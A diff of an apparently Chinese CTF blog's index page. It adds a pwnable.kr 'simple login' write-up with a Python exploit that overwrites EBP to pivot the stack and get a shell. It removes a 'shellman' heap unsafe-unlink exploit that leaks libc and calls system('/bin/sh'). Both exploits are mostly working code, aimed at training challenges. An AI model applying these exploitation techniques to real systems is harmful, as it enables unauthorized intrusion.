@@ -298,6 +298,130 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/26/pwnable-rookiss-simple-login/" itemprop="url">
+                  pwnable.kr-rookiss-simple-login
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-26T00:00:00+08:00" content="2016-07-26">
+              2016-07-26
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/26/pwnable-rookiss-simple-login/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/26/pwnable-rookiss-simple-login/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Trick">Trick</h2><ul>
+<li>输入payload后可以直接通过gdb的<code>searchmem</code>工具查找输入的字符串存放在内存的位置</li>
+</ul>
+<h2 id="Conclusion">Conclusion</h2><p>解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的<code>EBP</code>，这样，只要经历两次<code>leave</code>指令，就可以转移<code>ESP</code>到数据段上的payload处，之后的<code>ret</code>指令会跳转到payload上的地址，即我们已经构造好的<code>correct</code>函数的地址，从而拿到shell</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9003</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'AAAA'</span></span><br><span class="line">payload +=  l32(<span class="number">0x08049284</span>)</span><br><span class="line">payload +=  l32(<span class="number">0x0811eb40</span>)  </span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Authenticate :'</span>)</span><br><span class="line">io.writeline(b64encode(payload))</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo2/" itemprop="url">
                   pwnable.kr-rookiss-echo2
                 </a>
@@ -370,7 +494,7 @@
           
             <h2 id="Trick">Trick</h2><p>对于x64<strong>fsb</strong></p>
 <ul>
-<li><code>%1%lx</code>: RDI</li>
+<li><code>%1%lx</code>: RSI</li>
 <li><code>%2%lx</code>: RDX</li>
 <li><code>%3%lx</code>: RCX</li>
 <li><code>%4%lx</code>: R8</li>
@@ -788,130 +912,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/21/qiangwang-qual-2015-shellman/" itemprop="url">
-                  qiangwang-qual-2015-shellman
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/21/qiangwang-qual-2015-shellman/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/21/qiangwang-qual-2015-shellman/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>利用<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>中提到的<code>unsafe-unlink2</code>的技巧，通过泄露libc来调用system</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./shellman.b400c663a0ca53f1f6c6fcbf60defa8d'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007b0])    # new</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400790])     # delete</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007a0])     # edit</span></span><br><span class="line">io.gdb_hint([<span class="number">0x4007a7</span>])     <span class="comment"># edit finish</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007c0])     # list</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'SHELLC0DE 0: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_shellcode</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode(in raw format): '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_shellcode</span><span class="params">(index, shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line">    io.read_until(<span class="string">'Length of shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode: '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shellcode</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'A'</span> * <span class="number">0x90</span>)</span><br><span class="line">new_shellcode(<span class="string">'B'</span> * <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">adr_shellcode0  = <span class="number">0x6016d0</span></span><br><span class="line"></span><br><span class="line">fake0   =   l64(<span class="number">0x30</span>)</span><br><span class="line">fake0   +=  l64(<span class="number">0x91</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake0   =   fake0.ljust(<span class="number">0x90</span>, <span class="string">'A'</span>)</span><br><span class="line">fake1   =   l64(<span class="number">0x90</span>)</span><br><span class="line">fake1   +=  l64(<span class="number">0xa0</span>)</span><br><span class="line">payload = fake0 + fake1</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, payload)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_free    = <span class="number">0x601600</span></span><br><span class="line">edit_shellcode(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x8</span> + l64(<span class="number">0x1</span>) + l64(<span class="number">0x8</span>) + l64(got_free))</span><br><span class="line">list_shellcode()</span><br><span class="line"></span><br><span class="line">adr_free        = l64(io.read(<span class="number">0x10</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">offset_free     = <span class="number">0x82df0</span></span><br><span class="line">libc_base       = adr_free - offset_free</span><br><span class="line">offset_system   = <span class="number">0x46640</span></span><br><span class="line">adr_system      = libc_base + offset_system</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, l64(adr_system))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -957,7 +957,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">27</span>
+              <span class="site-state-item-count">28</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
